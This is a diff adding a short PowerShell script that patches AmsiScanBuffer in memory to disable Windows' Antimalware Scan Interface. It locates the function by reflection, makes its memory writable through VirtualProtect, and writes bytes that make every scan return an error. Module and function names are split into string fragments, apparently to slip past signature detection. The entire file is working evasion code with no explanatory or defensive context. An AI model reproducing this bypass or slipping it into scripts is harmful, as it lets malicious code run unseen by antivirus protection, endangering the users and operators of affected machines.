@@ -1,0 +1,22 @@
+function Get-FunctionBaseAddress {
+    Param ($moduleName, $functionName)
+    $UnsafeNativeMethods = ([AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $GetProcAddress = $UnsafeNativeMethods.GetMethods() | ? { $_.Name -eq "GetProcAddress" }
+    $FunctionAddress = $GetProcAddress[0].Invoke($null, ($UnsafeNativeMethods.GetMethod('GetModuleHandle').Invoke($null,@($moduleName)), $functionName))
+    return $FunctionAddress
+}
+function Get-DelegateType {
+    Param ([Type[]] $function, [Type] $dType = [Void] )
+    $newtype = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
+    $newtype.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $function).SetImplementationFlags('Runtime, Managed')
+    $newtype.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $dType, $function).SetImplementationFlags('Runtime, Managed')
+    return $newtype.CreateType()
+}
+$bytes = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[IntPtr]$addr = Get-FunctionBaseAddress -moduleName ("am"+"si.dll") -functionName ("Amsi"+"Scan"+"Buffer")
+$oldProtectionBuffer = 0
+[IntPtr] $vp_base = Get-FunctionBaseAddress -moduleName ("kern"+"el32.dll") -functionName ("Virtual"+"Protect")
+$vp_type = Get-DelegateType -function @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) -dType ([Bool])
+$vp_ptr=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vp_base, $vp_type)
+$vp_ptr.Invoke($addr, [uint32]5, 0x40, [ref]$oldProtectionBuffer)
+[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, 6)
